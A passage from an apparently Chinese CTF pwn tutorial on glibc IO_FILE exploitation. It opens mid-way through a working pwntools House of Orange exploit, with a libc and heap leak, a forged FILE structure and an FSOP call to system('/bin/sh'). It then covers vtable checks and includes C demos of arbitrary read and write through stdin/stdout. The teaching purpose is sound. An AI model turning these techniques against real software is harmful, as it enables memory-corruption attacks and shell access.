class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    <span class="keyword">global</span> malloc_hook, _IO_list_all, system_addr, heap_base</span><br><span class="line">    build(<span class="number">0x30</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk0</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    payload = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># size must be page aligned</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x1000</span>, <span class="string">b&#x27;f&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk1</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x400</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) <span class="comment"># chunk2</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    lk(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    lk(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    lk(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    upgrade(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    lk(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># fp-&gt;_mode &lt;= 0;fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</span></span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    connect()</span><br><span class="line">    leak()</span><br><span class="line">    FSOP()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="IO-vtable-check-检查及新的利用方法"><a href="#IO-vtable-check-检查及新的利用方法" class="headerlink" title="_IO_vtable_check 检查及新的利用方法"></a>_IO_vtable_check 检查及新的利用方法</h1><h2 id="glibc-2-24-加入的检查"><a href="#glibc-2-24-加入的检查" class="headerlink" title="glibc-2.24 加入的检查"></a>glibc-2.24 加入的检查</h2><p><code>glibc-2.24</code> 后加入了针对 <code>IO_FILE_plus</code> 的 <code>vtable</code> 劫持的检测措施，<code>glibc</code>  会在调用虚函数之前首先检查 <code>vtable</code> 地址的是否合法。首先会验证 <code>vtable</code> 是否位于<code>_IO_vtable</code>  段中，如果满足条件就正常执行，否则会调用 <code>_IO_vtable_check</code> 做进一步检查。如果 <code>vtable</code> 是非法的，那么会引发 <code>abort</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 计算 _IO_vtable 长度</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">    <span class="comment">// 计算 ptr 与 __start___libc_IO_vtables 距离</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">    <span class="comment">// 如果即不在 _IO_vtable_段内, 则调用 _IO_vtable_check ()</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        _IO_vtable_check ();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="built_in">void</span> (*flag) (<span class="type">void</span>) = <span class="built_in">atomic_load_relaxed</span> (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>判断 <code>vtable</code> 的地址是否处于 <code>glibc</code> 中的 <code>vtable</code> 数组段，是的话，通过检查。</li>
<li>否则判断是否为外部的合法 <code>vtable</code>（重构或是动态链接库中的vtable），是的话，通过检查。</li>
<li>否则报错，输出<code>Fatal error: glibc detected an invalid stdio handle</code>，程序退出。</li>
</ol>
<h2 id="fileno-相关利用"><a href="#fileno-相关利用" class="headerlink" title="_fileno 相关利用"></a>_fileno 相关利用</h2><p><code>_IO_FILE</code> 在使用标准 <code>IO</code> 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。进程中包含了系统默认的三个文件流 <code>stdin,stdout,stderr</code>，因此这种方式可以不需要进程中存在文件操作，通过 <code>scanf,printf </code>一样可以进行利用。</p>
<ul>
<li><code>fp-&gt;_fileno</code> 的值就是文件描述符，<code>stderr</code> 值为 <code>2</code>，<code>stdout</code> 值为 <code>1</code>，<code>stdin</code> 值为 <code>0</code>。</li>
<li><code>fp-&gt;_IO_buf_base</code> 表示操作的起始地址</li>
<li><code>fp-&gt;_IO_buf_end</code> 表示结束地址</li>
</ul>
<p><strong>stdin 任意写</strong></p>
<p>大致了解 <code>fread</code> 的执行流程后，还需要绕过以下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* fp-&gt;_IO_buf_base == NULL 会调用 _IO_doallocbuf (fp) 初始化缓冲区 */</span></span><br><span class="line">  	<span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	    	<span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	   		fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	    &#125;</span><br><span class="line">        _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 如果 fp-&gt;_IO_read_end &gt; fp-&gt;_IO_read_ptr 则会将缓冲区内容复制到目标地址 */</span></span><br><span class="line">	...</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	    want -= have;</span><br><span class="line">	    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	 &#125;</span><br><span class="line">     ...</span><br><span class="line">     <span class="comment">/* 如果输入长度大于缓冲区大小则会直接读入 */</span></span><br><span class="line">	 <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即:</p>
<ul>
<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即<code> _flag &amp;~ 0x4</code>。</li>
<li>设置 <code>_fileno</code> 为 <code>0</code> ，表示读入数据的来源是 <code>stdin</code> 。</li>
<li>设置<code> _IO_buf_base</code> 为 <code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> ；</li>
<li>使得 <code>_IO_buf_end - _IO_buf_base</code> 大于 <code>fread</code> 要读的数据。</li>
</ul>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// 0x1ec980 为 _IO_2_1_stdin_ 偏移</span></span><br><span class="line">    FILE *fp = libc_base + <span class="number">0x1ec980</span>;</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020153758598.png"
                      alt="image-20231020153758598"
                ></p>
<p><strong>stdout 任意写</strong></p>
<p>有如下源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        s += count;</span><br><span class="line">        to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将<code>_IO_write_ptr</code> 指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向 <code>write_end</code> 即可实现在目标地址写入数据。</p>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *stack_buf = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">fwrite</span>(stack_buf, <span class="number">1</span>, <span class="number">8</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nbuf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020182423234.png"
                      alt="image-20231020182423234"
                ></p>
<p><strong>stdout 任意读</strong></p>
<p>程序正确执行到 <code>_IO_overflow</code> 时，有如下源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr 就会将待输出的数据写入缓冲区，_IO_overflow 只有在输出缓冲区写满的时候才将其	   *  输出。因此为了不造成不必要的麻烦，直接令 f-&gt;_IO_write_end = f-&gt;_IO_write_ptr 。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    	count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  	<span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  	<span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">      	f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      	s += count;</span><br><span class="line">      	to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// _flags 不能包含 _IO_NO_WRITES，其值为 0x8 。</span></span><br><span class="line">  	<span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">     	 f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      	__set_errno (EBADF);</span><br><span class="line">      	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为了进入如下分枝进造成不必要的麻烦， _flags 应包含 _IO_CURRENTLY_PUTTING，其值为 0x0800</span></span><br><span class="line"> 	<span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        <span class="comment">// _IO_write_base = read_start，_IO_write_ptr = read_end </span></span><br><span class="line">  		<span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    		<span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) <span class="built_in">new_do_write</span> (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_ver</span> (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// 构造 _flags 包含 _IO_IS_APPENDING，其值为 0x1000 </span></span><br><span class="line">    <span class="comment">// 或者 _IO_read_end 等于 _IO_write_base 就可以直接执行到 _IO_SYSWRITE</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    	fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      	_IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      	<span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     	fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  	count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即<code> _flag &amp;~ 0x8</code>。</li>
<li>设置<code> _flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x800</code></li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。</li>
<li>设置 <code>_IO_read_end</code> 等于<code> _IO_write_base</code> 或设置 <code>_flag &amp; _IO_IS_APPENDING</code> 即 <code>_flag | 0x1000</code>。</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code>（非必须）。</li>
</ul>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// _IO_2_1_stdout</span></span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
